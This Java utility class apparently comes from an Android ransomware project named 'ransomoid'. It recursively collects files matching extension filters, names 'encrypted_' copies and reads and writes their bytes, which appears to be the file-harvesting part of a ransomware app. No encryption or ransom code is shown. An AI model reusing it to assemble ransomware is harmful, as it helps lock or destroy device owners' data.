package falezza.fabio.ransomoid.utils;

import android.os.Build;
import android.support.annotation.RequiresApi;
import android.text.TextUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;

/**
 * Created by fabio on 31/01/18.
 */

public class FileProcessor {

    private static FileProcessor instance;

    public static FileProcessor getInstance() {
        if (instance == null) {
            instance = new FileProcessor();
        }
        return instance;
    }

    private FileProcessor() {}

    public ArrayList<File> getFiles(File dir, String[] filter, String[] exclude) {
        ArrayList<File> files = new ArrayList<>();
        for (File file : dir.listFiles()) {
            if (file.isDirectory()) {
                files.addAll(this.getFiles(file, filter, exclude));
            } else {
                boolean isImage = false;
                for (String extension : filter) {
                    if (file.getPath().contains(extension)) {
                        isImage = true;
                        break;
                    }
                }
                for (String extension : exclude) {
                    if (file.getPath().contains(extension)) {
                        isImage = false;
                        break;
                    }
                }
                if (isImage) {
                    files.add(file);
                }
            }
        }
        return files;
    }

    public String getCopyName(File file) {
        return file.getParentFile().getPath() + File.separator + "encrypted_" + file.getName();
    }

    public byte[] readBytes(File file) throws IOException {
        int size = (int) file.length();
        byte bytes[] = new byte[size];
        byte tmpBuff[] = new byte[size];
        FileInputStream fis = new FileInputStream(file);
        int read = fis.read(bytes, 0, size);
        if (read < size) {
            int remain = size - read;
            while (remain > 0) {
                read = fis.read(tmpBuff, 0, remain);
                System.arraycopy(tmpBuff, 0, bytes, size - remain, read);
                remain -= read;
            }
        }
        fis.close();
        return bytes;
    }

    public File writeBytesToFile(byte[] bytes, String filename) throws IOException {
        File file = new File(filename);
        FileOutputStream fos = new FileOutputStream(file);
        fos.write(bytes);
        fos.close();
        return file;
    }
}
